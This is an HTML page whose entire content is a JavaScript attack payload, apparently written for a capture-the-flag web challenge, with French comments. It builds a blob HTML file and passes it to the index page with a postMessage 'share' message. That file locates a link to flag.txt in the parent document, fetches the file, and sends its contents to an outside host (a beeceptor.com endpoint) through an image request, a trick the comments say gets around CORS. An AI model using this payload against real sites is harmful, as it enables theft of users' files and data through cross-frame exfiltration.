<html><body><script>
(async () => {
  /* 1. blob html */
  const epic = `
    <script>
      (async () => {
        /* trouver le lien flag */
        const a=[...parent.document.querySelectorAll('a')]
                .find(x=>/flag\.txt$/.test(x.textContent));
        if(!a) return;
        const txt = await (await fetch(a.href)).text();
        /* exfiltration par balise img pour contourner CORS */
        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f='+
                          encodeURIComponent(txt);
      })();
    <\/script>`;
  const blob = new Blob([epic], {type:'text/html'});

  /* 2. postmessage vers la page index */
  window.postMessage({
    type:'share',
    files:[{blob, name:'epic.html', cached:false}]
  }, '*');
})();
</script></body></html>
